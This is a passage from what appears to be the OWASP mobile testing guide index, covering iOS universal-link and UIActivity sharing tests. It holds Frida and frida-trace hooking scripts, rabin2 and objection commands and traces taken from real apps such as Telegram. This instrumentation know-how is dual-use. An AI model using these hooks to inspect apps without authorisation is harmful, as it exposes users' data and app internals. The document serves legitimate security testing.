application:continueUserActivity:restorationHandler:\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#checking-the-data-handler-method","title":"Checking the Data Handler Method","text":"<p>You should check how the received data is validated. Apple explicitly warns about this:</p> <p>Universal links offer a potential attack vector into your app, so make sure to validate all URL parameters and discard any malformed URLs. In addition, limit the available actions to those that do not risk the user's data. For example, do not allow universal links to directly delete content or access sensitive information about the user. When testing your URL-handling code, make sure your test cases include improperly formatted URLs.</p> <p>As stated in the Apple Developer Documentation, when iOS opens an app as the result of a universal link, the app receives an <code>NSUserActivity</code> object with an <code>activityType</code> value of <code>NSUserActivityTypeBrowsingWeb</code>. The activity object's <code>webpageURL</code> property contains the HTTP or HTTPS URL that the user accesses. The following example in Swift verifies exactly this before opening the URL:</p> <pre><code>func application(_ application: UIApplication, continue userActivity: NSUserActivity,\n                 restorationHandler: @escaping ([UIUserActivityRestoring]?) -&gt; Void) -&gt; Bool {\n    // ...\n    if userActivity.activityType == NSUserActivityTypeBrowsingWeb, let url = userActivity.webpageURL {\n        application.open(url, options: [:], completionHandler: nil)\n    }\n\n    return true\n}\n</code></pre> <p>In addition, remember that if the URL includes parameters, they should not be trusted before being carefully sanitized and validated (even when coming from trusted domain). For example, they might have been spoofed by an attacker or might include malformed data. If that is the case, the whole URL and therefore the universal link request must be discarded.</p> <p>The <code>NSURLComponents</code> API can be used to parse and manipulate the components of the URL. This can be also part of the method <code>application:continueUserActivity:restorationHandler:</code> itself or might occur on a separate method being called from it. The following example demonstrates this:</p> <pre><code>func application(_ application: UIApplication,\n                 continue userActivity: NSUserActivity,\n                 restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool {\n    guard userActivity.activityType == NSUserActivityTypeBrowsingWeb,\n        let incomingURL = userActivity.webpageURL,\n        let components = NSURLComponents(url: incomingURL, resolvingAgainstBaseURL: true),\n        let path = components.path,\n        let params = components.queryItems else {\n        return false\n    }\n\n    if let albumName = params.first(where: { $0.name == \"albumname\" })?.value,\n        let photoIndex = params.first(where: { $0.name == \"index\" })?.value {\n        // Interact with album name and photo index\n\n        return true\n\n    } else {\n        // Handle when album and/or album name or photo index missing\n\n        return false\n    }\n}\n</code></pre> <p>Finally, as stated above, be sure to verify that the actions triggered by the URL do not expose sensitive information or risk the user's data on any way.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#checking-if-the-app-is-calling-other-apps-universal-links","title":"Checking if the App is Calling Other App's Universal Links","text":"<p>An app might be calling other apps via universal links in order to simply trigger some actions or to transfer information, in that case, it should be verified that it is not leaking sensitive information.</p> <p>If you have the original source code, you can search it for the <code>openURL:options: completionHandler:</code> method and check the data being handled.</p> <p>Note that the <code>openURL:options:completionHandler:</code> method is not only used to open universal links but also to call custom URL schemes.</p> <p>This is an example from the Telegram app:</p> <pre><code>}, openUniversalUrl: { url, completion in\n    if #available(iOS 10.0, *) {\n        var parsedUrl = URL(string: url)\n        if let parsed = parsedUrl {\n            if parsed.scheme == nil || parsed.scheme!.isEmpty {\n                parsedUrl = URL(string: \"https://\\(url)\")\n            }\n        }\n\n        if let parsedUrl = parsedUrl {\n            return UIApplication.shared.open(parsedUrl,\n                        options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],\n                        completionHandler: { value in completion.completion(value)}\n            )\n</code></pre> <p>Note how the app adapts the <code>scheme</code> to \"https\" before opening it and how it uses the option <code>UIApplicationOpenURLOptionUniversalLinksOnly: true</code> that opens the URL only if the URL is a valid universal link and there is an installed app capable of opening that URL.</p> <p>If you don't have the original source code, search in the symbols and in the strings of the app binary. For example, we will search for Objective-C methods that contain \"openURL\":</p> <pre><code>$ rabin2 -zq Telegram\\ X.app/Telegram\\ X | grep openURL\n\n0x1000dee3f 50 49 application:openURL:sourceApplication:annotation:\n0x1000dee71 29 28 application:openURL:options:\n0x1000df2c9 9 8 openURL:\n0x1000df772 35 34 openURL:options:completionHandler:\n</code></pre> <p>As expected, <code>openURL:options:completionHandler:</code> is among the ones found (remember that it might be also present because the app opens custom URL schemes). Next, to ensure that no sensitive information is being leaked you'll have to perform dynamic analysis and inspect the data being transmitted. Please refer to  Testing Custom URL Schemes for some examples on hooking and tracing this method.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>If an app is implementing universal links, you should have the following outputs from the static analysis:</p> <ul> <li>the associated domains</li> <li>the Apple App Site Association file</li> <li>the link receiver method</li> <li>the data handler method</li> </ul> <p>You can use this now to dynamically test them:</p> <ul> <li>Triggering universal links</li> <li>Identifying valid universal links</li> <li>Tracing the link receiver method</li> <li>Checking how the links are opened</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#triggering-universal-links","title":"Triggering Universal Links","text":"<p>Unlike custom URL schemes, unfortunately you cannot test universal links from Safari just by typing them in the search bar directly as this is not allowed by Apple. But you can test them anytime using other apps like the Notes app:</p> <ul> <li>Open the Notes app and create a new note.</li> <li>Write the links including the domain.</li> <li>Leave the editing mode in the Notes app.</li> <li>Long press the links to open them (remember that a standard click triggers the default option).</li> </ul> <p>To do it from Safari you will have to find an existing link on a website that once clicked, it will be recognized as a Universal Link. This can be a bit time consuming.</p> <p>Alternatively you can also use Frida for this, see  Testing Custom URL Schemes for more details.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#identifying-valid-universal-links","title":"Identifying Valid Universal Links","text":"<p>First of all we will see the difference between opening an allowed Universal Link and one that shouldn't be allowed.</p> <p>From the <code>apple-app-site-association</code> of apple.com we have seen above we chose the following paths:</p> <pre><code>\"paths\": [\n    \"NOT /shop/buy-iphone/*\",\n    ...\n    \"/today\",\n</code></pre> <p>One of them should offer the \"Open in app\" option and the other should not.</p> <p>If we long press on the first one (<code>http://www.apple.com/shop/buy-iphone/iphone-xr</code>) it only offers the option to open it (in the browser).</p> <p></p> <p>If we long press on the second (<code>http://www.apple.com/today</code>) it shows options to open it in Safari and in \"Apple Store\":</p> <p></p> <p>Note that there is a difference between a click and a long press. Once we long press a link and select an option, e.g. \"Open in Safari\", this will become the default option for all future clicks until we long press again and select another option.</p> <p>If we repeat the process on the method <code>application:continueUserActivity: restorationHandler:</code> by either hooking or tracing, we will see how it gets called as soon as we open the allowed universal link. For this you can use for example <code>frida-trace</code>:</p> <pre><code>frida-trace -U \"Apple Store\" -m \"*[* *restorationHandler*]\"\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#tracing-the-link-receiver-method","title":"Tracing the Link Receiver Method","text":"<p>This section explains how to trace the link receiver method and how to extract additional information. For this example, we will use Telegram, as there are no restrictions in its <code>apple-app-site-association</code> file:</p> <pre><code>{\n    \"applinks\": {\n        \"apps\": [],\n        \"details\": [\n            {\n                \"appID\": \"X834Q8SBVP.org.telegram.TelegramEnterprise\",\n                \"paths\": [\n                    \"*\"\n                ]\n            },\n            {\n                \"appID\": \"C67CF9S4VU.ph.telegra.Telegraph\",\n                \"paths\": [\n                    \"*\"\n                ]\n            },\n            {\n                \"appID\": \"X834Q8SBVP.org.telegram.Telegram-iOS\",\n                \"paths\": [\n                    \"*\"\n                ]\n            }\n        ]\n    }\n}\n</code></pre> <p>In order to open the links we will also use the Notes app and frida-trace with the following pattern:</p> <pre><code>frida-trace -U Telegram -m \"*[* *restorationHandler*]\"\n</code></pre> <p>Write <code>https://t.me/addstickers/radare</code> (found through a quick Internet research) and open it from the Notes app.</p> <p></p> <p>First we let frida-trace generate the stubs in <code>__handlers__/</code>:</p> <pre><code>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\"\nInstrumenting functions...\n-[AppDelegate application:continueUserActivity:restorationHandler:]\n</code></pre> <p>You can see that only one function was found and is being instrumented. Trigger now the universal link and observe the traces.</p> <pre><code>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n</code></pre> <p>You can observe that the function is in fact being called. You can now add code to the stubs in <code>__handlers__/</code> to obtain more details:</p> <pre><code>// __handlers__/__AppDelegate_application_contin_8e36bbb1.js\n\n  onEnter: function (log, args, state) {\n    log(\"-[AppDelegate application: \" + args[2] + \" continueUserActivity: \" + args[3] +\n                     \" restorationHandler: \" + args[4] + \"]\");\n    log(\"\\tapplication: \" + ObjC.Object(args[2]).toString());\n    log(\"\\tcontinueUserActivity: \" + ObjC.Object(args[3]).toString());\n    log(\"\\t\\twebpageURL: \" + ObjC.Object(args[3]).webpageURL().toString());\n    log(\"\\t\\tactivityType: \" + ObjC.Object(args[3]).activityType().toString());\n    log(\"\\t\\tuserInfo: \" + ObjC.Object(args[3]).userInfo().toString());\n    log(\"\\trestorationHandler: \" +ObjC.Object(args[4]).toString());\n  },\n</code></pre> <p>The new output is:</p> <pre><code>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298382 ms  application:&lt;Application: 0x10556b3c0&gt;\n298382 ms  continueUserActivity:&lt;NSUserActivity: 0x1c4237780&gt;\n298382 ms       webpageURL:http://t.me/addstickers/radare\n298382 ms       activityType:NSUserActivityTypeBrowsingWeb\n298382 ms       userInfo:{\n}\n298382 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n</code></pre> <p>Apart from the function parameters we have added more information by calling some methods from them to get more details, in this case about the <code>NSUserActivity</code>. If we look in the Apple Developer Documentation we can see what else we can call from this object.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#checking-how-the-links-are-opened","title":"Checking How the Links Are Opened","text":"<p>If you want to know more about which function actually opens the URL and how the data is actually being handled you should keep investigating.</p> <p>Extend the previous command in order to find out if there are any other functions involved into opening the URL.</p> <pre><code>frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\n</code></pre> <p><code>-i</code> includes any method. You can also use a glob pattern here (e.g. <code>-i \"*open*Url*\"</code> means \"include any function containing 'open', then 'Url' and something else\")</p> <p>Again, we first let frida-trace generate the stubs in <code>__handlers__/</code>:</p> <pre><code>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\nInstrumenting functions...\n-[AppDelegate application:continueUserActivity:restorationHandler:]\n$S10TelegramUI0A19ApplicationBindingsC16openUniversalUrlyySS_AA0ac4OpenG10Completion...\n$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData18application...\n$S10TelegramUI31AuthorizationSequenceControllerC7account7strings7openUrl5apiId0J4HashAC0A4Core19...\n...\n</code></pre> <p>Now you can see a long list of functions but we still don't know which ones will be called. Trigger the universal link again and observe the traces.</p> <pre><code>           /* TID 0x303 */\n298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298619 ms     | $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData\n                18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA\n                14OpenURLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display0\n                10NavigationO0CSgyyctF()\n</code></pre> <p>Apart from the Objective-C method, now there is one Swift function that is also of your interest.</p> <p>There is probably no documentation for that Swift function but you can just demangle its symbol using <code>swift-demangle</code> via <code>xcrun</code>:</p> <p>xcrun can be used invoke Xcode developer tools from the command-line, without having them in the path. In this case it will locate and run swift-demangle, an Xcode tool that demangles Swift symbols.</p> <pre><code>$ xcrun swift-demangle S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData\n18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0\n12PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF\n</code></pre> <p>Resulting in:</p> <pre><code>---&gt; TelegramUI.openExternalUrl(\n    account: TelegramCore.Account, context: TelegramUI.OpenURLContext, url: Swift.String,\n    forceExternal: Swift.Bool, presentationData: TelegramUI.PresentationData,\n    applicationContext: TelegramUI.TelegramApplicationContext,\n    navigationController: Display.NavigationController?, dismissInput: () -&gt; ()) -&gt; ()\n</code></pre> <p>This not only gives you the class (or module) of the method, its name and the parameters but also reveals the parameter types and return type, so in case you need to dive deeper now you know where to start.</p> <p>For now we will use this information to properly print the parameters by editing the stub file:</p> <pre><code>// __handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js\n\n  onEnter: function (log, args, state) {\n\n    log(\"TelegramUI.openExternalUrl(account: TelegramCore.Account,\n        context: TelegramUI.OpenURLContext, url: Swift.String, forceExternal: Swift.Bool,\n        presentationData: TelegramUI.PresentationData,\n        applicationContext: TelegramUI.TelegramApplicationContext,\n        navigationController: Display.NavigationController?, dismissInput: () -&gt; ()) -&gt; ()\");\n    log(\"\\taccount: \" + ObjC.Object(args[0]).toString());\n    log(\"\\tcontext: \" + ObjC.Object(args[1]).toString());\n    log(\"\\turl: \" + ObjC.Object(args[2]).toString());\n    log(\"\\tpresentationData: \" + args[3]);\n    log(\"\\tapplicationContext: \" + ObjC.Object(args[4]).toString());\n    log(\"\\tnavigationController: \" + ObjC.Object(args[5]).toString());\n  },\n</code></pre> <p>This way, the next time we run it we get a much more detailed output:</p> <pre><code>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298382 ms  application:&lt;Application: 0x10556b3c0&gt;\n298382 ms  continueUserActivity:&lt;NSUserActivity: 0x1c4237780&gt;\n298382 ms       webpageURL:http://t.me/addstickers/radare\n298382 ms       activityType:NSUserActivityTypeBrowsingWeb\n298382 ms       userInfo:{\n}\n298382 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n\n298619 ms     | TelegramUI.openExternalUrl(account: TelegramCore.Account,\ncontext: TelegramUI.OpenURLContext, url: Swift.String, forceExternal: Swift.Bool,\npresentationData: TelegramUI.PresentationData, applicationContext:\nTelegramUI.TelegramApplicationContext, navigationController: Display.NavigationController?,\ndismissInput: () -&gt; ()) -&gt; ()\n298619 ms     |     account: TelegramCore.Account\n298619 ms     |     context: nil\n298619 ms     |     url: http://t.me/addstickers/radare\n298619 ms     |     presentationData: 0x1c4e40fd1\n298619 ms     |     applicationContext: nil\n298619 ms     |     navigationController: TelegramUI.PresentationData\n</code></pre> <p>There you can observe the following:</p> <ul> <li>It calls <code>application:continueUserActivity:restorationHandler:</code> from the app delegate as expected.</li> <li><code>application:continueUserActivity:restorationHandler:</code> handles the URL but does not open it, it calls <code>TelegramUI.openExternalUrl</code> for that.</li> <li>The URL being opened is <code>https://t.me/addstickers/radare</code>.</li> </ul> <p>You can now keep going and try to trace and verify how the data is being validated. For example, if you have two apps that communicate via universal links you can use this to see if the sending app is leaking sensitive data by hooking these methods in the receiving app. This is especially useful when you don't have the source code as you will be able to retrieve the full URL that you wouldn't see other way as it might be the result of clicking some button or triggering some functionality.</p> <p>In some cases, you might find data in <code>userInfo</code> of the <code>NSUserActivity</code> object. In the previous case there was no data being transferred but it might be the case for other scenarios. To see this, be sure to hook the <code>userInfo</code> property or access it directly from the <code>continueUserActivity</code> object in your hook (e.g. by adding a line like this <code>log(\"userInfo:\" + ObjC.Object(args[3]).userInfo().toString());</code>).</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/#final-notes-about-universal-links-and-handoff","title":"Final Notes about Universal Links and Handoff","text":"<p>Universal links and Apple's Handoff feature are related:</p> <ul> <li>Both rely on the same method when receiving data:</li> </ul> <pre><code>application:continueUserActivity:restorationHandler:\n</code></pre> <ul> <li>Like universal links, the Handoff's Activity Continuation must be declared in the <code>com.apple.developer.associated-domains</code> entitlement and in the server's <code>apple-app-site-association</code> file (in both cases via the keyword <code>\"activitycontinuation\":</code>). See \"Retrieving the Apple App Site Association File\" above for an example.</li> </ul> <p>Actually, the previous example in \"Checking How the Links Are Opened\" is very similar to the \"Web Browser-to-Native App Handoff\" scenario described in the \"Handoff Programming Guide\":</p> <p>If the user is using a web browser on the originating device, and the receiving device is an iOS device with a native app that claims the domain portion of the <code>webpageURL</code> property, then iOS launches the native app and sends it an <code>NSUserActivity</code> object with an <code>activityType</code> value of <code>NSUserActivityTypeBrowsingWeb</code>. The <code>webpageURL</code> property contains the URL the user was visiting, while the <code>userInfo</code> dictionary is empty.</p> <p>In the detailed output above you can see that <code>NSUserActivity</code> object we've received meets exactly the mentioned points:</p> <pre><code>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298382 ms  application:&lt;Application: 0x10556b3c0&gt;\n298382 ms  continueUserActivity:&lt;NSUserActivity: 0x1c4237780&gt;\n298382 ms       webpageURL:http://t.me/addstickers/radare\n298382 ms       activityType:NSUserActivityTypeBrowsingWeb\n298382 ms       userInfo:{\n}\n298382 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n</code></pre> <p>This knowledge should help you when testing apps supporting Handoff.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/","title":"MASTG-TEST-0071: Testing UIActivity Sharing","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0071: Testing UIActivity Sharing (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/#static-analysis","title":"Static Analysis","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/#sending-items","title":"Sending Items","text":"<p>When testing <code>UIActivity</code> Sharing you should pay special attention to:</p> <ul> <li>the data (items) being shared,</li> <li>the custom activities,</li> <li>the excluded activity types.</li> </ul> <p>Data sharing via <code>UIActivity</code> works by creating a <code>UIActivityViewController</code> and passing it the desired items (URLs, text, a picture) on <code>init(activityItems: applicationActivities:)</code>.</p> <p>As we mentioned before, it is possible to exclude some of the sharing mechanisms via the controller's <code>excludedActivityTypes</code> property. It is highly recommended to do the tests using the latest versions of iOS as the number of activity types that can be excluded can increase. The developers have to be aware of this and explicitly exclude the ones that are not appropriate for the app data. Some activity types might not be even documented like \"Create Watch Face\".</p> <p>If having the source code, you should take a look at the <code>UIActivityViewController</code>:</p> <ul> <li>Inspect the activities passed to the <code>init(activityItems:applicationActivities:)</code> method.</li> <li>Check if it defines custom activities (also being passed to the previous method).</li> <li>Verify the <code>excludedActivityTypes</code>, if any.</li> </ul> <p>If you only have the compiled/installed app, try searching for the previous method and property, for example using  rabin2:</p> <pre><code>$ rabin2 -zq Telegram\\ X.app/Telegram\\ X | grep -i activityItems\n0x1000df034 45 44 initWithActivityItems:applicationActivities:\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/#receiving-items","title":"Receiving Items","text":"<p>When receiving items, you should check:</p> <ul> <li>if the app declares custom document types by looking into Exported/Imported UTIs (\"Info\" tab of the Xcode project). The list of all system declared UTIs (Uniform Type Identifiers) can be found in the archived Apple Developer Documentation.</li> <li>if the app specifies any document types that it can open by looking into Document Types (\"Info\" tab of the Xcode project). If present, they consist of name and one or more UTIs that represent the data type (e.g. \"public.png\" for PNG files). iOS uses this to determine if the app is eligible to open a given document (specifying Exported/Imported UTIs is not enough).</li> <li>if the app properly verifies the received data by looking into the implementation of <code>application:openURL:options:</code> (or its deprecated version <code>UIApplicationDelegate application:openURL:sourceApplication:annotation:</code>) in the app delegate.</li> </ul> <p>If not having the source code you can still take a look into the <code>Info.plist</code> file and search for:</p> <ul> <li><code>UTExportedTypeDeclarations</code>/<code>UTImportedTypeDeclarations</code> if the app declares exported/imported custom document types.</li> <li><code>CFBundleDocumentTypes</code> to see if the app specifies any document types that it can open.</li> </ul> <p>A very complete explanation about the use of these keys can be found on Stackoverflow.</p> <p>Let's see a real-world example. We will take a File Manager app and take a look at these keys. We used  objection here to read the <code>Info.plist</code> file.</p> <pre><code>objection --gadget SomeFileManager run ios plist cat Info.plist\n</code></pre> <p>Note that this is the same as if we would retrieve the IPA from the phone or accessed via e.g. SSH and navigated to the corresponding folder in the IPA / app sandbox. However, with objection we are just one command away from our goal and this can be still considered static analysis.</p> <p>The first thing we noticed is that app does not declare any imported custom document types but we could find a couple of exported ones:</p> <pre><code>UTExportedTypeDeclarations =     (\n            {\n        UTTypeConformsTo =             (\n            \"public.data\"\n        );\n        UTTypeDescription = \"SomeFileManager Files\";\n        UTTypeIdentifier = \"com.some.filemanager.custom\";\n        UTTypeTagSpecification =             {\n            \"public.filename-extension\" =                 (\n                ipa,\n                deb,\n                zip,\n                rar,\n                tar,\n                gz,\n                ...\n                key,\n                pem,\n                p12,\n                cer\n            );\n        };\n    }\n);\n</code></pre> <p>The app also declares the document types it opens as we can find the key <code>CFBundleDocumentTypes</code>:</p> <pre><code>CFBundleDocumentTypes =     (\n        {\n        ...\n        CFBundleTypeName = \"SomeFileManager Files\";\n        LSItemContentTypes =             (\n            \"public.content\",\n            \"public.data\",\n            \"public.archive\",\n            \"public.item\",\n            \"public.database\",\n            \"public.calendar-event\",\n            ...\n        );\n    }\n);\n</code></pre> <p>We can see that this File Manager will try to open anything that conforms to any of the UTIs listed in <code>LSItemContentTypes</code> and it's ready to open files with the extensions listed in <code>UTTypeTagSpecification/\"public.filename-extension\"</code>. Please take a note of this because it will be useful if you want to search for vulnerabilities when dealing with the different types of files when performing dynamic analysis.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/#dynamic-analysis","title":"Dynamic Analysis","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/#sending-items_1","title":"Sending Items","text":"<p>There are three main things you can easily inspect by performing dynamic instrumentation:</p> <ul> <li>The <code>activityItems</code>: an array of the items being shared. They might be of different types, e.g. one string and one picture to be shared via a messaging app.</li> <li>The <code>applicationActivities</code>: an array of <code>UIActivity</code> objects representing the app's custom services.</li> <li>The <code>excludedActivityTypes</code>: an array of the Activity Types that are not supported, e.g. <code>postToFacebook</code>.</li> </ul> <p>To achieve this you can do two things:</p> <ul> <li>Hook the method we have seen in the static analysis (<code>init(activityItems: applicationActivities:)</code>) to get the <code>activityItems</code> and <code>applicationActivities</code>.</li> <li>Find out the excluded activities by hooking <code>excludedActivityTypes</code> property.</li> </ul> <p>Let's see an example using Telegram to share a picture and a text file. First prepare the hooks, we will use the Frida REPL and write a script for this:</p> <pre><code>Interceptor.attach(\nObjC.classes.\n    UIActivityViewController['- initWithActivityItems:applicationActivities:'].implementation, {\n  onEnter: function (args) {\n\n    printHeader(args)\n\n    this.initWithActivityItems = ObjC.Object(args[2]);\n    this.applicationActivities = ObjC.Object(args[3]);\n\n    console.log(\"initWithActivityItems: \" + this.initWithActivityItems);\n    console.log(\"applicationActivities: \" + this.applicationActivities);\n\n  },\n  onLeave: function (retval) {\n    printRet(retval);\n  }\n});\n\nInterceptor.attach(\nObjC.classes.UIActivityViewController['- excludedActivityTypes'].implementation, {\n  onEnter: function (args) {\n    printHeader(args)\n  },\n  onLeave: function (retval) {\n    printRet(retval);\n  }\n});\n\nfunction printHeader(args) {\n  console.log(Memory.readUtf8String(args[1]) + \" @ \" + args[1])\n};\n\nfunction printRet(retval) {\n  console.log('RET @ ' + retval + ': ' );\n  try {\n    console.log(new ObjC.Object(retval).toString());\n  } catch (e) {\n    console.log(retval.toString());\n  }\n};\n</code></pre> <p>You can store this as a JavaScript file, e.g. <code>inspect_send_activity_data.js</code> and load it like this:</p> <pre><code>frida -U Telegram -l inspect_send_activity_data.js\n</code></pre> <p>Now observe the output when you first share a picture:</p> <pre><code>[*] initWithActivityItems:applicationActivities: @ 0x18c130c07\ninitWithActivityItems: (\n    \"&lt;UIImage: 0x1c4aa0b40&gt; size {571, 264} orientation 0 scale 1.000000\"\n)\napplicationActivities: nil\nRET @ 0x13cb2b800:\n&lt;UIActivityViewController: 0x13cb2b800&gt;\n\n[*] excludedActivityTypes @ 0x18c0f8429\nRET @ 0x0:\nnil\n</code></pre> <p>and then a text file:</p> <pre><code>[*] initWithActivityItems:applicationActivities: @ 0x18c130c07\ninitWithActivityItems: (\n    \"&lt;QLActivityItemProvider: 0x1c4a30140&gt;\",\n    \"&lt;UIPrintInfo: 0x1c0699a50&gt;\"\n)\napplicationActivities: (\n)\nRET @ 0x13c4bdc00:\n&lt;_UIDICActivityViewController: 0x13c4bdc00&gt;\n\n[*] excludedActivityTypes @ 0x18c0f8429\nRET @ 0x1c001b1d0:\n(\n    \"com.apple.UIKit.activity.MarkupAsPDF\"\n)\n</code></pre> <p>You can see that:</p> <ul> <li>For the picture, the activity item is a <code>UIImage</code> and there are no excluded activities.</li> <li>For the text file there are two different activity items and <code>com.apple.UIKit.activity. MarkupAsPDF</code> is excluded.</li> </ul> <p>In the previous example, there were no custom <code>applicationActivities</code> and only one excluded activity. However, to better illustrate what you can expect from other apps we have shared a picture using another app, here you can see a bunch of application activities and excluded activities (output was edited to hide the name of the originating app):</p> <pre><code>[*] initWithActivityItems:applicationActivities: @ 0x18c130c07\ninitWithActivityItems: (\n    \"&lt;SomeActivityItemProvider: 0x1c04bd580&gt;\"\n)\napplicationActivities: (\n    \"&lt;SomeActionItemActivityAdapter: 0x141de83b0&gt;\",\n    \"&lt;SomeActionItemActivityAdapter: 0x147971cf0&gt;\",\n    \"&lt;SomeOpenInSafariActivity: 0x1479f0030&gt;\",\n    \"&lt;SomeOpenInChromeActivity: 0x1c0c8a500&gt;\"\n)\nRET @ 0x142138a00:\n&lt;SomeActivityViewController: 0x142138a00&gt;\n\n[*] excludedActivityTypes @ 0x18c0f8429\nRET @ 0x14797c3e0:\n(\n    \"com.apple.UIKit.activity.Print\",\n    \"com.apple.UIKit.activity.AssignToContact\",\n    \"com.apple.UIKit.activity.SaveToCameraRoll\",\n    \"com.apple.UIKit.activity.CopyToPasteboard\",\n)\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0071/#receiving-items_1","title":"Receiving Items","text":"<p>After performing the static analysis you would know the document types that the app can open and if it declares any custom document types and (part of) the methods involved. You can use this now to test the receiving part:</p> <ul> <li>Share a file with the app from another app or send it via AirDrop or e-mail. Choose the file so that it will trigger the \"Open with...\" dialogue (that is, there is no default app that will open the file, a PDF for example).</li> <li>Hook <code>application:openURL:options:</code> and any other methods that were identified in a previous static analysis.</li> <li>Observe the app behavior.</li> <li>In addition, you could send specific malformed files and/or use a fuzzing technique.</li> </ul> <p>To illustrate this with an example we have chosen the same real-world file manager app from the static analysis section and followed these steps:</p> <ol> <li>Send a PDF file from another Apple device (e.g. a MacBook) via Airdrop.</li> <li>Wait for the AirDrop popup to appear and click on Accept.</li> <li> <p>As there is no default app that will open the file, it switches to the Open with... popup. There, we can select the app that will open our file. The next screenshot shows this (we have modified the display name using Frida to conceal the app's real name):</p> <p></p> </li> <li> <p>After selecting SomeFileManager we can see the following:</p> <pre><code>(0x1c4077000)  -[AppDelegate application:openURL:options:]\napplication: &lt;UIApplication: 0x101c00950&gt;\nopenURL: file:///var/mobile/Library/Application%20Support\n                    /Containers/com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf\noptions: {\n    UIApplicationOpenURLOptionsAnnotationKey =     {\n        LSMoveDocumentOnOpen = 1;\n    };\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.sharingd\";\n    \"_UIApplicationOpenURLOptionsSourceProcessHandleKey\" = \"&lt;FBSProcessHandle: 0x1c3a63140;\n                                                                sharingd:605; valid: YES&gt;\";\n}\n0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n...\n0x1857cdc34 FrontBoardServices!-[FBSSerialQueue _performNextFromRunLoopSource]\nRET: 0x1\n</code></pre> </li> </ol> <p>As you can see, the sending application is <code>com.apple.sharingd</code> and the URL's scheme is <code>file://</code>. Note that once we select the app that should open the file, the system already moved the file to the corresponding destination, that is to the app's Inbox. The apps are then responsible for deleting the files inside their Inboxes. This app, for example, moves the file to <code>/var/mobile/Documents/</code> and removes it from the Inbox.</p> <pre><code>(0x1c002c760)  -[XXFileManager 